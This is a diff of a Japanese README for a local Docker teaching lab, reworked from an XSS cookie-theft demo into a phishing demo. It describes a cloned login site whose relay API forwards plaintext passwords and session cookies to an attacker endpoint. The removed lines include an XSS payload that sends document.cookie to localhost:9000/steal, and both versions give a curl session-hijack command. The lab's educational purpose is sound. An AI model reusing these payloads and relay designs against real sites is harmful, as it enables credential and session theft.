@@ -1,6 +1,6 @@
-# XSS デモ環境
+# フィッシング / XSS デモ環境
 
-フロントのバリデーション突破・XSSによるCookie窃取・なりすましを、ローカルDockerで再現する学習用環境。
+ログインフォームを偽装したフィッシングサイトで、被害者の認証情報とセッションCookieを窃取する流れを、ローカルDockerで再現する学習用環境。
 
 ---
 
@@ -8,29 +8,36 @@
 
 ```
 ブラウザ
-  └── localhost:80 (Nginx)
-        ├── /       → frontend (React + Vite)  :5173
-        └── /api/   → backend  (FastAPI)        :8000
+  ├── localhost:80   (本物サイト / Nginx)
+  │     ├── /        → frontend (React + Vite)  :5173
+  │     └── /api/    → backend  (FastAPI)        :8000
+  │
+  └── localhost:8080 (フィッシングサイト / Nginx)
+        ├── /            → frontend (本物と同じReact)
+        ├── /api/login   → phishing-api  :8081  ← ここだけ偽物
+        └── /api/...     → backend (本物)
 
-localhost:9000 → attacker (攻撃者サーバー / FastAPI)
+localhost:9000 → attacker (窃取受信サーバー / FastAPI)
 ```
 
 ### コンテナ一覧
 
 | コンテナ | 役割 | 公開ポート |
 |---|---|---|
-| nginx | リバースプロキシ（同一オリジン化） | 80 |
-| frontend | React フォーム画面 | なし（nginx経由） |
-| backend | 認証・API | なし（nginx経由） |
-| attacker | Cookie窃取を受け取る攻撃者サーバー | 9000 |
+| nginx | 本物サイトのリバースプロキシ | 80 |
+| phishing-nginx | フィッシングサイトのリバースプロキシ | 8080 |
+| frontend | React フォーム/ダッシュボード | なし(nginx経由) |
+| backend | 認証・セッション発行 API | なし(nginx経由) |
+| phishing-api | `/api/login` の中間者。本物に中継しつつ窃取 | なし(phishing-nginx経由) |
+| attacker | 窃取データ受信・閲覧サーバー | 9000 |
 
 ### 意図的に仕込んだ脆弱性
 
 | 箇所 | 脆弱な実装 | 本来の対策 |
 |---|---|---|
-| `frontend/src/App.tsx` | `dangerouslySetInnerHTML` でユーザー入力をそのまま描画 | JSXの `{}` で表示（自動エスケープ） |
-| `backend/main.py` | `httponly=False` でJSからCookieを読める | `httponly=True` |
-| フロントバリデーション | クライアント側のみ | サーバー側でも検証 |
+| `backend/main.py` | `httponly=False` で session Cookie を発行 | `httponly=True` |
+| `phishing/main.py` | フィッシングサイトが平文のid/pwを attacker に転送 | (利用者が偽サイトを見抜く / ブラウザのフィッシング警告) |
+| `frontend/src/App.tsx` | クライアント側バリデーションのみ | サーバー側でも検証 |
 
 ---
 
@@ -40,8 +47,9 @@ localhost:9000 → attacker (攻撃者サーバー / FastAPI)
 docker-compose up --build
 ```
 
-- 被害者画面: http://localhost
-- 攻撃者ログ: http://localhost:9000/log
+- 本物サイト: http://localhost
+- フィッシングサイト: http://localhost:8080
+- 窃取ログ: http://localhost:9000/log
 
 ---
 
@@ -49,75 +57,79 @@ docker-compose up --build
 
 ```
 ユーザー名: admin
-パスワード:  password123
+パスワード: password123
 ```
 
 ---
 
-## XSS 再現手順
+## フィッシング 再現手順
 
-### Step 1: 正規ログインでCookieを発行させる
+### Step 1: 被害者が偽サイトでログインする
 
-フォームに正しい認証情報を入力して送信する。  
-バックエンドが `session_id=abc123_secret_token` をCookieにセットする。
+`http://localhost:8080` を開く。見た目は本物 `http://localhost` と完全に同じ React アプリ。被害者が `admin` / `password123` を入力して送信。
 
-### Step 2: XSSペイロードを送り込む
+### Step 2: phishing-api が中間者として振る舞う
 
-フォームのいずれかのフィールドに以下を入力して送信する（認証は失敗するが、XSSは発火する）。
+`POST /api/login` だけは `phishing-nginx` 経由で `phishing-api` に届く。phishing-api は次のことを同時に行う:
 
-**動作確認用（alertでCookieを表示）**
-```
-<img src=x onerror="alert('Cookie: ' + document.cookie)">
-```
+1. 受け取った id/pw を **本物の backend に転送**してログインを成功させ、`session_id` Cookie を取得
+2. 取得した `session_id` と **平文の id/pw を attacker サーバーへ送信** (`/steal?via=phishing&user=...&password=...&c=session_id=...`)
+3. 被害者には本物の `session_id` を Cookie としてセットし、レスポンスに `redirect: "http://localhost"` を含めて返す
 
-→ `session_id=abc123_secret_token` を含むCookieがalertに表示される。
+### Step 3: 被害者は本物サイトにリダイレクトされる
 
-**Cookie窃取用（攻撃者サーバーへ送信）**
-```
-<img src=x onerror="new Image().src='http://localhost:9000/steal?c='+encodeURIComponent(document.cookie)">
-```
+`frontend/src/App.tsx` の `handleSubmit` が `loginData.redirect` を読み、`window.location.href` で `http://localhost` に遷移。被害者は「ログインに成功した」と認識し、異変に気づかない。
 
-→ 攻撃者サーバーのターミナルに `[!!!] Cookie窃取成功: session_id=abc123_secret_token` と表示される。
-
-### Step 3: 窃取したCookieでなりすまし
-
-```bash
-curl -b "session_id=abc123_secret_token" http://localhost:80/api/me
-```
-
-レスポンス:
-```json
-{"username": "admin", "email": "admin@example.com", "role": "admin"}
-```
-
-id/pw を知らなくても、被害者のセッションで本人になりきれる。
-
-### Step 4: 窃取ログを確認
+### Step 4: 攻撃者は認証情報とセッションを手に入れている
 
 ```
 http://localhost:9000/log
 ```
 
-攻撃者サーバーが受け取ったCookieの一覧が表示される。
+```json
+{
+  "stolen": [
+    {
+      "cookie": "session_id=abc123_secret_token",
+      "via": "phishing",
+      "user": "admin",
+      "password": "password123",
+      "ip": "..."
+    }
+  ]
+}
+```
+
+平文のパスワードまで取れているので、Cookieが切れても再ログイン可能。
+
+### Step 5: 窃取した Cookie でなりすまし
+
+```bash
+curl -b "session_id=abc123_secret_token" http://localhost/api/me
+```
+
+```json
+{"username": "admin", "email": "admin@example.com", "role": "admin"}
+```
 
 ---
 
-## なぜ同一オリジンが必要か
+## なぜこの構成で成立するか
 
-Nginxでフロント・バックを `localhost:80` に統一しているのは、Cookie窃取を成立させるため。
-
-- **別オリジン構成**（フロント:5173、バック:8000）の場合、バックがセットしたCookieはフロントのJSから読めない
-- **同一オリジン構成**（どちらも:80）にすることで `document.cookie` にCookieが現れ、XSSで読み取り可能になる
+- フィッシングサイト側のフロントは**本物と完全に同じ React アプリ**を `proxy_pass` しているため、URL以外に見分ける手段が無い
+- `/api/login` だけを phishing-api に向けることで、攻撃者は「ログインAPIの中継点」になる
+- backend が `httponly=False` で Cookie を発行しているため、`document.cookie` 経由でも JS から読める(将来的にXSSデモを足す際の前提)
 
 ---
 
-## API一覧
+## API 一覧
 
 | メソッド | パス | 説明 |
 |---|---|---|
-| POST | /api/login | 認証（admin/password123が正解） |
-| POST | /api/submit | フォーム送信（Cookieを発行） |
-| GET | /api/me | Cookie認証でユーザー情報を返す |
-| GET | /api/health | ヘルスチェック |
-| GET | localhost:9000/steal | Cookie窃取エンドポイント（攻撃者側） |
-| GET | localhost:9000/log | 窃取済みCookieの一覧（攻撃者側） |
+| POST | localhost/api/login | 本物の認証API (admin/password123) |
+| POST | localhost/api/submit | フォーム送信(Cookie発行) |
+| GET  | localhost/api/me | Cookie認証でユーザー情報を返す |
+| GET  | localhost/api/health | ヘルスチェック |
+| POST | localhost:8080/api/login | フィッシングの偽ログイン(中継+窃取) |
+| GET  | localhost:9000/steal | 窃取エンドポイント(`c`, `via`, `user`, `password`) |
+| GET  | localhost:9000/log | 窃取済みデータの一覧 |
